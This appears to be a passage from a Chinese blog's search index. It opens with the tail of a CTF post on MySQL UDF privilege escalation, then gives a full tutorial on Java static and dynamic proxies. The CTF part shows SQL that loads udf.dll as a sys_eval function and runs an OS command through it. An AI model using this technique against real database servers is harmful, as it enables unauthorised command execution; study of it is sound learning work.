&#x27;udf.dll&#x27; (errno: 126 )</span><br><span class="line"># 而不是报错找不到这个文件</span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692614584661.png"></p><h1 id="windows利用和linux的不同"><a href="#windows利用和linux的不同" class="headerlink" title="windows利用和linux的不同"></a>windows利用和linux的不同</h1><p><code>Linux</code> 的用户权限划分比较严格，因此需要运维人员配置错误 <code>MySQL</code> 的启动权限比较高才能利用成功。而 <code>windows</code> 用户权限划分比较宽松，默认的启动权限就可以利用成功。</p><p>还有上面在没有找到 <code>udf</code> 文件的情况下，两个系统的报错信息也不同，<code>Linux</code> 会报错显示出目标 <code>udf</code> 文件不存在，并且显示出了插件库正确应当存放的路径，而 <code>windows</code> 只会报错显示无法打开这个文件，不会显示插件库的具体路径，但是还是可以通过 <code>show variables like &quot;%plugin%&quot;;</code> 来泄露插件库的存放路径。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84MySQL%20UDF%E6%8F%90%E6%9D%83.md</span><br><span class="line">https://juejin.cn/post/7100562573254213668#heading-16</span><br><span class="line">https://www.cnblogs.com/mrhonest/p/10836621.html</span><br><span class="line">https://www.cnblogs.com/miansj/p/13996110.html</span><br><span class="line">https://blog.csdn.net/qq_44159028/article/details/121193134</span><br><span class="line">https://www.freebuf.com/vuls/348300.html</span><br><span class="line">https://blog.csdn.net/whatday/article/details/102807541</span><br><span class="line">https://www.sqlsec.com/2020/11/mysql.html#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93</span><br><span class="line">https://blog.51cto.com/u_16175511/6673705</span><br><span class="line">https://www.sqlsec.com/tools/udf.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 提权 </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代理模式</title>
      <link href="/2023/02/26/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/"/>
      <url>/2023/02/26/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>代理模式 <code>Java</code> 当中最常用的设计模式之一。其特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。而Java的代理机制分为静态代理和动态代理，而这里我们主要重点学习 <code>java</code> 自带的 <code>jdk</code> 动态代理机制。</p><p><img src="/imgs/Pasted%20image%2020230110212328.png"></p><h1 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h1><p>在讲动态代理之前，我们先了解下什么是静态代理。静态代理在编译使用时,定义接口或者父类,被代理对象与代理对象一起实现相同的接口或者是继承相同父类。我们用一个出租房子作为实例讲解。</p><p>&#x3D;&#x3D;静态代理的本质就是多态。&#x3D;&#x3D;</p><ul><li><p>定义一个接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Rental</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>委托类，实现接口的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Entrust</span> <span class="keyword">implements</span> <span class="title class_">Rental</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;出租房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>代理类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentRental</span> <span class="keyword">implements</span> <span class="title class_">Rental</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Rental target; <span class="comment">// 被代理对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AgentRental</span><span class="params">(Rental target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房子出租价位有1k-3k&quot;</span>); <span class="comment">// 增加新的操作</span></span><br><span class="line">        target.sale(); <span class="comment">// 调用Entrust委托类的sale方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>测试类，生成委托类实例对象，并将该对象传入代理类构造函数中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="comment">// 静态代理使用示例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">consumer</span><span class="params">(Rental subject)</span> &#123;</span><br><span class="line">        subject.sale();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Rental</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entrust</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;---使用代理之前---&quot;</span>);</span><br><span class="line">        consumer(test);</span><br><span class="line">        System.out.println(<span class="string">&quot;---使用代理之后---&quot;</span>);</span><br><span class="line">        consumer(<span class="keyword">new</span> <span class="title class_">AgentRental</span>(test));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/imgs/Pasted%20image%2020230110224603.png"></p><p>通过上面的例子，我们可以看见静态代理的优点：</p><p>我们可以在不改变 <code>Entrust</code> 委托类源代码的情况下 ,通过 <code>AgentRental</code> 代理类来修改 <code>Entrust</code> 委托类的功能，从而实现“代理”操作。在进行代理后，自定义说明房子出租价位有1k-3k的操作方法。</p><p>但这个是我们通过代理类进行实现更改的方法，如果当我们需要过多的代理类对委托类进行修改的情况下，则可能出现下图情况:</p><p><img src="/imgs/Pasted%20image%2020230110224709.png"></p><p>由此可以我们得知此静态代理的缺点：</p><ol><li><p>当我们的 <strong>接口类需要增加和删除方式</strong> 的时候，委托类和代理类都需要更改，不容易维护。</p></li><li><p>同时如果需要 <strong>代理多个类</strong> 的时候，每个委托类都要编写一个代理类，会导致代理类繁多，不好管理。</p></li></ol><p>因为 <code>java</code> 静态代理是对类进行操作的，我们需要一个个代理类去实现对委托类的更改操作，针对这个情况，我们可以利用动态代理来解决，通过程序运行时自动生成代理类。</p><h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>Java</code> 动态代理位于 <code>Java.lang.reflect</code> 包下，我们一般就仅涉及 <code>Java.lang.reflect.Proxy</code> 类与 <code>InvocationHandler</code> 接口,使用其配合反射，完成实现动态代理的操作。</p><ul><li><code>InvocationHandler</code> 接口：负责提供调用代理操作。</li></ul><p>是由代理对象调用处理器实现的接口，定义了一个 <code>invoke()</code> 方法，每个代理对象都有一个关联的接口。当代理对象上调用方法时，该方法会被自动转发到<code>InvocationHandler.invoke()</code> 方法来进行调用。</p><p><img src="/imgs/Pasted%20image%2020230111152229.png"></p><ul><li><code>Proxy</code> 类：负责动态构建代理类</li></ul><p>提供四个静态方法来为一组接口动态生成的代理类并返回代理类的实例对象。<br>![](imgs&#x2F;Pasted image 20230111152239.png)</p><p><code>getProxyClass(ClassLoader,Class&lt;?&gt;...)</code>：<br>获取指定类加载器和动态代理类对象。</p><p><code>newProxyInstance(ClassLoader,Class&lt;?&gt;[],InvocationHandler)</code>：<br>指定类加载器，一组接口，调用处理器；</p><p><code>isProxyClass(Class&lt;?&gt;)</code>：<br>判断获取的类是否为一个动态代理类;</p><p><code>getInvocationHandler(Object)</code>：<br>获取指定代理类实例查找与它相关联的调用处理器实例;</p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><ol><li><p>使用 <code>java.lang.InvocationHandler</code> 接口创建自定义调用处理器，由它来实现 <code>invoke</code> 方法，执行代理函数；</p></li><li><p>使用 <code>java.lang.reflect.Proxy</code> 类指定一个 <code>ClassLoader</code>，一组 <code>interface</code> 接口和一个 <code>InvocationHandler</code> ；</p></li><li><p>通过反射机制获得动态代理类的构造方法，其唯一参数类型是调用处理器接口类型；</p></li><li><p>调用 <code>java.lang.reflect.Proxy.newProxyInstance()</code> 方法，分别传入类加载器，被代理接口，调用处理器；创建动态代理实例对象。</p></li><li><p>通过代理对象调用目标方法；</p></li></ol><h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><p>委托类和接口与上面的静态代理是一致的。只是修改代理类和测试类。</p><p>&#x3D;&#x3D;关键：&#x3D;&#x3D;<br>通过下面代理类的代码可以发现，代理类增强的功能与委托类和接口无关（代码中不存在与委托类相关联的代码），在静态代理的时候，如果我们想对多个不同接口下的委托类做 &#x3D;&#x3D;同样&#x3D;&#x3D; 的功能增强（也就是下面的 <code>System.out.println(&quot;房子的出租价位有1k-3k&quot;)</code> ），我们只需要写一个代理类，而不用对每个接口下的委托类都写一个代理类。这就是动态代理的好处！我们只需要在使用时（这里是测试中）指定我们要对哪个委托类进行代理即可（代理类会自动判断该委托类是哪个接口的）。</p><p><img src="/imgs/1675526216224.png"></p><ul><li><p>代理类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestAgent</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestAgent</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房子的出租价位有1k-3k&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>测试类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Rental test = new Entrust();</span></span><br><span class="line"><span class="comment">//        test.sale();</span></span><br><span class="line"><span class="comment">//        (new AgentRental(test)).sale();</span></span><br><span class="line">        <span class="comment">// 获取委托类的实例对象</span></span><br><span class="line">        <span class="type">Entrust</span> <span class="variable">testEntrust</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entrust</span>();</span><br><span class="line">        <span class="comment">// 获取CLassLoader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> testEntrust.getClass().getClassLoader();</span><br><span class="line">        <span class="comment">// 获取所有接口</span></span><br><span class="line">        Class[] interfaces = testEntrust.getClass().getInterfaces();</span><br><span class="line">        <span class="comment">// 获取一个调用处理器</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestAgent</span>(testEntrust);</span><br><span class="line">        <span class="comment">// 查看生成的代理类</span></span><br><span class="line">        <span class="comment">//小于等于jdk1.8的版本</span></span><br><span class="line">        System.getProperties().put(<span class="string">&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line"><span class="comment">//大于jdk1.8的版本</span></span><br><span class="line">System.getProperties().put(<span class="string">&quot;jdk.proxy.ProxyGenerator.saveGeneratedFiles&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"><span class="comment">// 创建代理对象</span></span><br><span class="line">        <span class="type">Rental</span> <span class="variable">proxy</span> <span class="operator">=</span> (Rental) Proxy.newProxyInstance(classLoader,interfaces,invocationHandler);</span><br><span class="line">        <span class="comment">// 调用代理对象的sayHello()方法</span></span><br><span class="line">        proxy.sale();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>这里我们可以看见我们生成的动态代理类的字节码文件，放置在程序根目录下的     <code>com.sun.proxy.$Proxy0.class</code> 文件中。</p><p><img src="/imgs/1673421547108.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.sun.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.just.test.Rental;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.UndeclaredThrowableException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">$Proxy0</span> <span class="keyword">extends</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">Rental</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m1;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m2;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m3;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m0;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $Proxy0(InvocationHandler var1) <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="built_in">super</span>(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object var1)</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Boolean)<span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m1, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var1&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">toString</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (String)<span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m2, (Object[])<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m3, (Object[])<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Integer)<span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m0, (Object[])<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            m1 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;equals&quot;</span>, Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>));</span><br><span class="line">            m2 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;toString&quot;</span>);</span><br><span class="line">            m3 = Class.forName(<span class="string">&quot;com.just.test.Rental&quot;</span>).getMethod(<span class="string">&quot;sale&quot;</span>);</span><br><span class="line">            m0 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodError</span>(var2.getMessage());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(var3.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里生成的 <code>$Proxy0</code> 代理类中，我们可以清楚知道动态代理的实现过程。实际上我们在创建代理对象时，就是通过通过反射来获取这个类的构造方法，然后来创建的代理实例。</p><h2 id="动态代理的原理"><a href="#动态代理的原理" class="headerlink" title="动态代理的原理"></a>动态代理的原理</h2><ol><li>通过委托类的 <code>classLoader</code> 和 <code>interfaces</code> 来构建一个新生成的代理类。<br><img src="/imgs/1675529146630.png"></li></ol><p><img src="/imgs/1675529257065.png"></p><ol start="2"><li>通过反射，获取新代理类的 <code>constructor</code> ，从而得到新代理类的一个实例。<br>这里是通过 <code>InvocationHandler</code> 实例化新的代理类，为的是能够使用原来自己写的代理类。<br><img src="/imgs/1675529520461.png"></li><li>在新生成的代理类的实例中调用 <code>InvocationHandler</code> 的 <code>invoke()</code> 方法。<br>这里的 <code>super.h</code> 就是 <code>InvocationHandler</code> ，也就是原来自己写的代理类。<br><img src="/imgs/1675528651998.png"></li></ol><p><img src="/imgs/1675528959137.png"></p><ol start="4"><li>在 <code>InvocationHandler</code> （或者说是代理类）中的 <code>invoke()</code> 通过反射调用委托类的方法。<code>method.invoke(target, args);</code><br><img src="/imgs/1675528476162.png"></li></ol><p>注意这两个 <code>invoke()</code> 方法不一样，一个是 <code>InvocationHandler</code> 的 <code>invoke(Object Proxy, Method method, Object[] args)</code> 方法，一个是反射中 <code>Method</code> 类的 <code>invoke(Object object, Object[] args)</code> 方法。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/9197#toc-0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
